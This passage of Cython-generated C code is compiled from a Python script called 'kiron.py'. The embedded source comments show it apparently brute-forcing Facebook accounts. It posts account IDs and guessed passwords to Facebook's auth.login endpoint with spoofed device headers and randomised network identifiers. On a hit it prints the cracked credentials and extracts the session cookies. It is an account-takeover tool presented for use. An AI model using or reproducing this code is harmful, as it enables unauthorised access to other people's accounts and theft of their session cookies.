        __pyx_t_18 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_18, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 619, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 619, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_session_id, __pyx_t_12) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        /* "kiron.py":620
 *                                 'password':pas,
 *                                 "session_id": str(uuid.uuid4()),
 *                                 "advertiser_id": str(uuid.uuid4()),             # <<<<<<<<<<<<<<
 *                                 "reg_instance": str(uuid.uuid4()),
 *                                 "logged_out_id": str(uuid.uuid4()),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 620, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 620, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
          __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 620, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 620, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_advertiser_id, __pyx_t_18) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        /* "kiron.py":621
 *                                 "session_id": str(uuid.uuid4()),
 *                                 "advertiser_id": str(uuid.uuid4()),
 *                                 "reg_instance": str(uuid.uuid4()),             # <<<<<<<<<<<<<<
 *                                 "logged_out_id": str(uuid.uuid4()),
 *                                 "hash_id": str(uuid.uuid4()),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_uuid); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 621, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 621, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_12, NULL};
          __pyx_t_18 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 621, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_18); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 621, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_reg_instance, __pyx_t_4) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":622
 *                                 "advertiser_id": str(uuid.uuid4()),
 *                                 "reg_instance": str(uuid.uuid4()),
 *                                 "logged_out_id": str(uuid.uuid4()),             # <<<<<<<<<<<<<<
 *                                 "hash_id": str(uuid.uuid4()),
 *                                 "sim_country": "id",
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_uuid); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 622, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 622, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_18, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 622, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 622, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_logged_out_id, __pyx_t_12) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        /* "kiron.py":623
 *                                 "reg_instance": str(uuid.uuid4()),
 *                                 "logged_out_id": str(uuid.uuid4()),
 *                                 "hash_id": str(uuid.uuid4()),             # <<<<<<<<<<<<<<
 *                                 "sim_country": "id",
 *                                 "network_country": "id",
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 623, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 623, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
          __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_18, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 623, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        }
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 623, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_hash_id, __pyx_t_18) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_sim_country, __pyx_n_s_id) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_network_country, __pyx_n_s_id) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_enroll_misauth, __pyx_n_s_false) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_analytics_claims, __pyx_kp_s_1) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_credentials_type, __pyx_n_s_password_2) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_source, __pyx_n_s_login) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_error_detail_type, __pyx_n_s_button_with_disabled) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_enroll_misauth, __pyx_n_s_false) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_cpl, __pyx_n_s_true) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_session_cookies, __pyx_kp_s_1) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_machine_id, __pyx_kp_s_1) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_meta_inf_fbmeta, __pyx_kp_s__63) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_currently_logged_in_userid, __pyx_kp_s_0_2) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_fb_api_req_friendly_name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_fb_api_caller_class, __pyx_kp_s_com_facebook_account_login_proto) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "kiron.py":641
 *                         }
 *                         headers={
 *                                 'Authorization':f'OAuth {accessToken}',             # <<<<<<<<<<<<<<
 *                                 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
 *                                 "X-FB-Net-HNI": str(random.randint(900000, 999999)),
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_accessToken, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyUnicode_Concat(__pyx_kp_u_OAuth, __pyx_t_18); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_Authorization, __pyx_t_12) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        /* "kiron.py":642
 *                         headers={
 *                                 'Authorization':f'OAuth {accessToken}',
 *                                 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),             # <<<<<<<<<<<<<<
 *                                 "X-FB-Net-HNI": str(random.randint(900000, 999999)),
 *                                 "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 642, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 642, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__90, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 642, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 642, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Connection_Bandwidth, __pyx_t_18) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

        /* "kiron.py":643
 *                                 'Authorization':f'OAuth {accessToken}',
 *                                 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
 *                                 "X-FB-Net-HNI": str(random.randint(900000, 999999)),             # <<<<<<<<<<<<<<
 *                                 "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
 *                                 'X-FB-Friendly-Name':'authenticate',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 643, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_randint); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 643, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__91, NULL); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 643, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_18); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 643, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Net_HNI, __pyx_t_12) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

        /* "kiron.py":644
 *                                 "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
 *                                 "X-FB-Net-HNI": str(random.randint(900000, 999999)),
 *                                 "X-FB-SIM-HNI": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Type':'unknown',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 644, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 644, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 644, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 644, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_SIM_HNI, __pyx_t_18) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Friendly_Name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Connection_Type, __pyx_n_s_unknown) < 0) __PYX_ERR(0, 641, __pyx_L3_error)

        /* "kiron.py":647
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Type':'unknown',
 *                                 'User-Agent': AYYUB_M2(),             # <<<<<<<<<<<<<<
 *                                 'Accept-Encoding':'gzip, deflate',
 *                                 'Content-Type': 'application/x-www-form-urlencoded',
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_AYYUB_M2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 647, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_4 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
          __pyx_t_18 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 647, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_User_Agent, __pyx_t_18) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Accept_Encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Content_Type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_HTTP_Engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 641, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "kiron.py":652
 *                                 'X-FB-HTTP-Engine': 'Liger'
 *                                 }
 *                         url = 'https://graph.facebook.com/method/auth.login'             # <<<<<<<<<<<<<<
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 */
        __Pyx_INCREF(__pyx_kp_s_https_graph_facebook_com_method);
        __Pyx_XDECREF_SET(__pyx_v_url, __pyx_kp_s_https_graph_facebook_com_method);

        /* "kiron.py":653
 *                                 }
 *                         url = 'https://graph.facebook.com/method/auth.login'
 *                         po = requests.post(url,data=data,headers=headers).json()             # <<<<<<<<<<<<<<
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_requests); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 653, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_post); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 653, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyTuple_New(1); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 653, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        if (__Pyx_PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_v_url)) __PYX_ERR(0, 653, __pyx_L3_error);
        __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 653, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 653, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 653, __pyx_L3_error)
        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_18, __pyx_t_4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 653, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 653, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 653, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_po, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":654
 *                         url = 'https://graph.facebook.com/method/auth.login'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 */
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_v_po, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 654, __pyx_L3_error)
        if (__pyx_t_23) {

          /* "kiron.py":655
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 */
          __pyx_t_5 = PyNumber_Add(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5_2, __pyx_v_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 655, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_u_38_5_244m_38_5_46m_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 655, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_pas); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 655, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 655, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 655, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "kiron.py":656
 *                         if 'session_key' in po:
 *                                         print(f'\r\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m '+ids+f' ~\x1b[38;5;244m\x1b[38;5;46m '+pas+'\033[1;97m')
 *                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])             # <<<<<<<<<<<<<<
 *                                         print(f"\r\r\x1b[38;5;244m (\x1b[38;5;46m\x1b[38;5;244m)>>{A} "+coki)
 *                                         linex()
 */
          __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_session_cookies); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 656, __pyx_L3_error)
